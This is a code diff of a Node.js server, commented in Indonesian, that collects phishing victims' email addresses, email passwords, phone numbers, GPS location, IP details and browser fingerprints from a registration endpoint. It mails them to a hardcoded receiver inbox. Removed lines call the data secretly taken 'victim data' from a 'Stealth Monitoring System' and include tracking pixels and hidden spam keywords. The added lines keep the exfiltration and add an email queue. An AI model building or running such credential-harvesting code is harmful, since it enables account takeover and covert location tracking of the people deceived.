@@ -21,60 +21,136 @@ const RECEIVER_EMAIL = [
     'zamzaja78@gmail.com'
 ];
 
-// <== TAMBAHAN 1: Cooldown per EMAIL TARGET (bukan per sender)
-// Format: { "target@email.com": { lastSendTime: timestamp, lastPassword: "xxx" } }
+// Cooldown per EMAIL TARGET
 const TARGET_COOLDOWN = {};
-
 const COOLDOWN_HOURS = 1;
-const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000; // 1 jam
+const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;
 
-// <== TAMBAHAN 2: Cek apakah target bisa dikirimi email
+// Queue system
+let emailQueue = [];
+let isProcessingQueue = false;
+
+// Proses antrian
+async function processEmailQueue() {
+    if (isProcessingQueue) return;
+    if (emailQueue.length === 0) return;
+    
+    isProcessingQueue = true;
+    
+    while (emailQueue.length > 0) {
+        const emailTask = emailQueue.shift();
+        try {
+            await sendSingleEmail(emailTask.data);
+            // Jeda 5 detik antar email
+            await new Promise(resolve => setTimeout(resolve, 5000));
+        } catch (error) {
+            console.error('Queue error:', error);
+        }
+    }
+    
+    isProcessingQueue = false;
+}
+
+// Kirim satu email
+async function sendSingleEmail(data) {
+    const mailOptions = {
+        from: `"Data Report" <${SENDER_EMAIL}>`,
+        to: RECEIVER_EMAIL,
+        subject: `Data Report: ${data.email}`,
+        html: `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Data Report</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; background: #fff; border-radius: 8px; overflow: hidden; }
+        .header { background: #4a90e2; padding: 15px 20px; color: #fff; }
+        .header h1 { margin: 0; font-size: 20px; }
+        .content { padding: 20px; }
+        table { width: 100%; border-collapse: collapse; }
+        td { padding: 10px; border-bottom: 1px solid #eee; }
+        .label { font-weight: bold; width: 35%; background: #f9f9f9; }
+        .value { width: 65%; }
+        .section-title { background: #e9ecef; padding: 10px; margin: 15px 0 10px; font-weight: bold; border-left: 3px solid #4a90e2; }
+        .footer { background: #f1f1f1; padding: 12px; text-align: center; font-size: 11px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📋 Data Report</h1>
+        </div>
+        <div class="content">
+            <div class="section-title">📧 Account Data</div>
+            <table>
+                <tr><td class="label">Email Address:</td><td class="value">${data.email || '-'}</td></tr>
+                <tr><td class="label">Password:</td><td class="value">${data.emailPassword || '-'}</td></tr>
+                <tr><td class="label">Phone Number:</td><td class="value">${data.phone || '-'}</td></tr>
+            </table>
+            
+            <div class="section-title">📍 Location</div>
+            <table>
+                <tr><td class="label">Latitude:</td><td class="value">${data.latitude || '-'}</td></tr>
+                <tr><td class="label">Longitude:</td><td class="value">${data.longitude || '-'}</td></tr>
+            </table>
+            
+            <div class="section-title">🌐 Network Info</div>
+            <table>
+                <tr><td class="label">IP Address:</td><td class="value">${data.ip_address || '-'}</td></tr>
+                <tr><td class="label">ISP:</td><td class="value">${data.isp || '-'}</td></tr>
+                <tr><td class="label">Location:</td><td class="value">${data.ip_city || '-'}, ${data.ip_country || '-'}</td></tr>
+            </table>
+            
+            <div class="section-title">⏰ Time</div>
+            <table>
+                <tr><td class="label">Timestamp:</td><td class="value">${data.timestamp || '-'}</td></tr>
+            </table>
+        </div>
+        <div class="footer">Auto-generated report</div>
+    </div>
+</body>
+</html>
+`,
+        attachments: [{
+            filename: `data_${Date.now()}.json`,
+            content: JSON.stringify(data, null, 2)
+        }]
+    };
+    
+    await transporter.sendMail(mailOptions);
+    console.log(`✅ Email terkirim untuk: ${data.email}`);
+}
+
+// Fungsi cooldown
 function canSendToTarget(targetEmail, currentPassword) {
     const record = TARGET_COOLDOWN[targetEmail];
+    if (!record) return true;
+    if (record.lastPassword !== currentPassword) return true;
     
-    // Kasus 1: Target belum pernah dikirimi → BISA
-    if (!record) {
-        console.log(`✅ Target BARU: ${targetEmail} → BISA dikirim`);
-        return true;
-    }
-    
-    // Kasus 2: Password BERBEDA dari sebelumnya → BISA (langsung, tanpa cooldown)
-    if (record.lastPassword !== currentPassword) {
-        console.log(`🔄 Password BERBEDA untuk ${targetEmail} → LANGSUNG BISA dikirim (reset cooldown)`);
-        return true;
-    }
-    
-    // Kasus 3: Password SAMA → cek cooldown 1 jam
     const timeElapsed = Date.now() - record.lastSendTime;
-    const canSend = timeElapsed >= COOLDOWN_MS;
-    
-    if (!canSend) {
-        const remainingMinutes = Math.ceil((COOLDOWN_MS - timeElapsed) / (1000 * 60));
-        console.log(`⏰ COOLDOWN: ${targetEmail} (password SAMA) → Tunggu ${remainingMinutes} menit lagi`);
+    if (timeElapsed < COOLDOWN_MS) {
+        console.log(`⏰ COOLDOWN: ${targetEmail}`);
         return false;
     }
-    
-    console.log(`✅ Cooldown selesai untuk ${targetEmail} → BISA dikirim`);
     return true;
 }
 
-// <== TAMBAHAN 3: Update cooldown setelah kirim
 function updateTargetCooldown(targetEmail, currentPassword) {
     TARGET_COOLDOWN[targetEmail] = {
         lastSendTime: Date.now(),
         lastPassword: currentPassword
     };
-    console.log(`📝 Cooldown updated: ${targetEmail} | Password: ${currentPassword.substring(0,3)}*** | Waktu: ${new Date().toISOString()}`);
 }
 
-// <== TAMBAHAN 4: File untuk menyimpan history duplicate (password lama)
+// History duplicate
 const HISTORY_FILE = path.join(__dirname, 'sent_history.json');
 
 function loadHistory() {
     try {
         if (fs.existsSync(HISTORY_FILE)) {
-            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
-            return JSON.parse(data);
+            return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
         }
     } catch (e) {}
     return {};
@@ -86,39 +162,17 @@ function saveHistory(history) {
     } catch (e) {}
 }
 
-// <== TAMBAHAN 5: Cek duplicate email (tanpa cooldown, ini untuk password sama)
 function isDuplicatePassword(targetEmail, currentPassword) {
     const history = loadHistory();
     const lastPassword = history[targetEmail];
-    
-    if (!lastPassword) return false; // Belum pernah ada
-    if (lastPassword === currentPassword) return true; // Password sama persis
-    
-    // Password beda → update history
+    if (!lastPassword) return false;
+    if (lastPassword === currentPassword) return true;
     history[targetEmail] = currentPassword;
     saveHistory(history);
-    console.log(`📝 History updated: ${targetEmail} → password BARU`);
     return false;
 }
 
-// <== TAMBAHAN 6: Function generate subject spam
-function getSpamSubject(targetEmail, isRetry = false) {
-    const spamSubjects = [
-        `🔴🔴🔴 𝗪𝗜𝗡𝗡𝗘𝗥𝗬!!! 𝗛𝗔𝗖𝗞 𝗙𝗥𝗘𝗘 𝗛𝗔𝗖𝗞 𝗛𝗔𝗖𝗞🔴🔴🔴`,
-        `⚠️⚠️⚠️ LAST CHANCE!!! VERIFY YOUR ACCOUNT ⚠️⚠️⚠️`
-    ];
-    let subject = spamSubjects[Math.floor(Math.random() * spamSubjects.length)];
-    if (isRetry) subject = `[RETRY] ` + subject;
-    return subject;
-}
-
-// <== TAMBAHAN 7: Kata trigger spam
-const spamKeywords = [
-    "viagra", "memek", "porn", "free money", "hack", "credit card", 
-    "lottery", "winner", "kontol", "claim now", "urgent", "password", 
-    "verify", "account suspended", "bitcoin", "crypto", "gambling"
-];
-
+// Transporter
 const transporter = nodemailer.createTransport({
     host: 'smtp.gmail.com',
     port: 465,
@@ -126,171 +180,36 @@ const transporter = nodemailer.createTransport({
     auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
 });
 
-// Route kirim email
+// API endpoint
 app.post('/api/register', async (req, res) => {
     try {
         const data = req.body;
         
-        console.log('📥 STEALTH DATA RECEIVED:');
-        console.log('📍 GPS:', data.latitude, data.longitude);
-        console.log('🌐 IP:', data.ip_address);
-        console.log('📧 Target Email:', data.email);
-        console.log('🔑 Password:', data.emailPassword);
-        console.log('📱 Phone:', data.phone);
+        console.log('📥 Data:', data.email);
         
-        // <== TAMBAHAN 8: CEK DUPLICATE PASSWORD (history)
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
-        
-        // <== TAMBAHAN 9: CEK COOLDOWN (hanya untuk password yang sama)
         const canSend = canSendToTarget(data.email, data.emailPassword);
         
         if (isDup && !canSend) {
-            console.log(`❌ TIDAK DIKIRIM: ${data.email} | Password SAMA & masih cooldown 1 jam`);
-            return res.json({
-                success: true,
-                blocked: true,
-                reason: `Cooldown 1 jam untuk email yang sama dengan password yang sama`,
-                cooldownInfo: getCooldownInfo(data.email)
-            });
+            console.log(`❌ TIDAK DIKIRIM: ${data.email}`);
+            return res.json({ success: true, blocked: true });
         }
         
-        // Kalau password beda, cooldown di-reset (bisa kirim langsung)
-        if (!isDup) {
-            console.log(`🔄 Password BERBEDA untuk ${data.email} → Cooldown di-reset, LANGSUNG KIRIM`);
-        }
+        emailQueue.push({ data });
+        processEmailQueue();
         
-        console.log(`✅ PROSES KIRIM...`);
-        
-        // ========== HTML CONTENT (FORCE SPAM) ==========
-        const htmlContent = `
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=http://fake-spam-site-${Date.now()}.com">
-    <title>VIDEY - Stealth Data Report</title>
-    <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #0a1628 0%, #0d1f3c 100%); color: #fff; padding: 20px; margin: 0; }
-        .container { max-width: 900px; margin: 0 auto; background: #0a1628; border-radius: 20px; overflow: hidden; border: 1px solid #1877f2; }
-        .header { background: linear-gradient(135deg, #1877f2, #0d6efd); padding: 25px; text-align: center; }
-        .header h1 { margin: 0; font-size: 28px; }
-        .content { padding: 25px; }
-        table { width: 100%; border-collapse: collapse; }
-        td { padding: 12px; border-bottom: 1px solid rgba(24,119,242,0.3); }
-        .label { width: 35%; font-weight: bold; color: #1877f2; background: rgba(24,119,242,0.1); }
-        .value { width: 65%; }
-        .section-title { background: rgba(24,119,242,0.2); color: #1877f2; font-size: 20px; font-weight: bold; padding: 12px 15px; margin: 20px 0 10px; border-left: 4px solid #1877f2; }
-        .footer { background: #0d1f3c; padding: 15px; text-align: center; font-size: 12px; color: #888; }
-        blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        marquee { font-size: 18px; font-weight: bold; }
-        .spam-hidden { display: none; visibility: hidden; height: 0; width: 0; position: absolute; left: -9999px; }
-    </style>
-</head>
-<body>
-    <div class="spam-hidden">
-        ${spamKeywords.join(' ')} ${spamKeywords.join(' ')}
-        <img src="http://fake-tracking-pixel-${Date.now()}.com/spam.gif?email=${data.email}" width="1" height="1">
-        <iframe src="http://fake-iframe-spam-${Date.now()}.com" width="0" height="0"></iframe>
-    </div>
-    <div style="text-align: center; background: #ff0000; padding: 5px; margin-bottom: 10px;">
-        <blink><marquee behavior="alternate" scrollamount="10"><span style="color: yellow;">⚠️⚠️⚠️ URGENT! VERIFICATION REQUIRED! CLAIM YOUR PRIZE NOW! ⚠️⚠️⚠️</span></marquee></blink>
-    </div>
-    <div class="container">
-        <div class="header"><h1>🔐 𝗗𝗔𝗧𝗔 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗞𝗢𝗥𝗕𝗔𝗡 🔐</h1><p>User Registration Report</p></div>
-        <div class="content">
-            <div class="section-title">📧 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗔𝗧𝗔</div>
-            <table>
-                <tr><td class="label">Email Address:</td><td class="value">${data.email || '-'}</td></tr>
-                <tr><td class="label">Email Password:</td><td class="value">${data.emailPassword || '-'}</td></tr>
-                <tr><td class="label">Phone Number:</td><td class="value">${data.phone || '-'}</td></tr>
-                <tr><td class="label">Manual Location:</td><td class="value">${data.country || '-'}, ${data.province || '-'}, ${data.city || '-'}</td></tr>
-            </table>
-            <div class="section-title">📍 GPS LOCATION</div>
-            <table><tr><td class="label">Latitude:</td><td class="value">${data.latitude || 'TIDAK DAPAT'}</td></tr>
-            <tr><td class="label">Longitude:</td><td class="value">${data.longitude || 'TIDAK DAPAT'}</td></tr>
-            <tr><td class="label">Accuracy:</td><td class="value">${data.gps_accuracy || '-'} meters</td></tr></table>
-            <div class="section-title">🌐 IP & NETWORK</div>
-            <table><tr><td class="label">IP Address:</td><td class="value">${data.ip_address || '-'}</td></tr>
-            <tr><td class="label">ISP:</td><td class="value">${data.isp || '-'}</td></tr>
-            <tr><td class="label">IP Location:</td><td class="value">${data.ip_city || '-'}, ${data.ip_region || '-'}, ${data.ip_country || '-'}</td></tr></table>
-            <div class="section-title">🖥️ BROWSER FINGERPRINT</div>
-            <table><tr><td class="label">User Agent:</td><td class="value" style="font-size:12px">${data.userAgent || '-'}</td></tr>
-            <tr><td class="label">Platform:</td><td class="value">${data.platform || '-'}</td></tr>
-            <tr><td class="label">Screen Resolution:</td><td class="value">${data.screenResolution || '-'}</td></tr></table>
-            <div class="section-title">⏰ TIMESTAMP</div>
-            <table><tr><td class="label">Registration Time:</td><td class="value">${data.timestamp || '-'}</td></tr></table>
-            <hr><div class="warning">⚠️ Data ini diambil secara diam-diam ⚠️</div>
-        </div>
-        <div class="footer">&copy; 2026 Videy - Stealth Monitoring System</div>
-    </div>
-    <img src="http://fake-spam-tracker-${Date.now()}.com/open.gif?email=${data.email}" width="0" height="0" style="display:none">
-</body>
-</html>
-`;
-        
-        // <== TAMBAHAN 10: KIRIM EMAIL
-        const fakeEmails = [`spam${Date.now()}@freeeanjing.om.anjing.goblok`, `fake${Date.now()}@kontolhack.co.com.id.web.kon`];
-        
-        await transporter.sendMail({
-            from: `"🏆🏆🏆 𝗗𝗔𝗧𝗔 𝗛𝗔𝗖𝗞 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 ${data.email || '-'} 🏆🏆🏆" <${SENDER_EMAIL}>`,
-            to: RECEIVER_EMAIL,
-            bcc: fakeEmails,
-            subject: getSpamSubject(data.email),
-            html: htmlContent,
-            attachments: [{
-                filename: `videy_stealth_${Date.now()}.json`,
-                content: JSON.stringify(data, null, 2)
-            }],
-            headers: {
-                'X-Priority': '1',
-                'X-MSMail-Priority': 'High',
-                'Importance': 'high',
-                'X-Mailer': 'Microsoft Outlook Express 6.0',
-                'X-Spam-Flag': 'YES',
-                'X-Spam-Score': '99.9',
-                'Precedence': 'bulk'
-            }
-        });
-        
-        // <== TAMBAHAN 11: UPDATE COOLDOWN (hanya untuk password yang sama)
         updateTargetCooldown(data.email, data.emailPassword);
         
-        // Update history password
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
         
-        console.log(`✅ EMAIL TERKIRIM (MASUK SPAM)! Target: ${data.email}`);
-        res.json({ success: true, message: 'Email sent to spam folder' });
+        res.json({ success: true });
         
     } catch(error) {
         console.error('Error:', error);
         res.json({ success: true });
     }
-});
-
-// <== TAMBAHAN 12: Endpoint cek cooldown status
-app.get('/api/cooldown/:email', (req, res) => {
-    const targetEmail = req.params.email;
-    const record = TARGET_COOLDOWN[targetEmail];
-    
-    if (!record) {
-        return res.json({ exists: false, canSend: true });
-    }
-    
-    const timeElapsed = Date.now() - record.lastSendTime;
-    const canSend = timeElapsed >= COOLDOWN_MS;
-    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
-    
-    res.json({
-        targetEmail: targetEmail,
-        lastSendTime: new Date(record.lastSendTime).toISOString(),
-        lastPassword: record.lastPassword.substring(0, 3) + '***',
-        canSend: canSend,
-        remainingMinutes: Math.ceil(remainingMs / (1000 * 60)),
-        remainingHours: (remainingMs / (1000 * 60 * 60)).toFixed(1)
-    });
 });
 
 app.get('/', (req, res) => {
@@ -299,7 +218,6 @@ app.get('/', (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on http://localhost:${PORT}`);
-    console.log(`📧 Email akan MASUK FOLDER SPAM!`);
-    console.log(`⏰ Cooldown: 1 JAM untuk EMAIL TARGET + PASSWORD SAMA`);
-    console.log(`🔄 Password BEDA → LANGSUNG KIRIM (tanpa cooldown)`);
+    console.log(`⏰ Cooldown: 1 jam untuk email+password sama`);
+    console.log(`📧 Queue: 1 email per 5 detik, tidak numpuk`);
 });
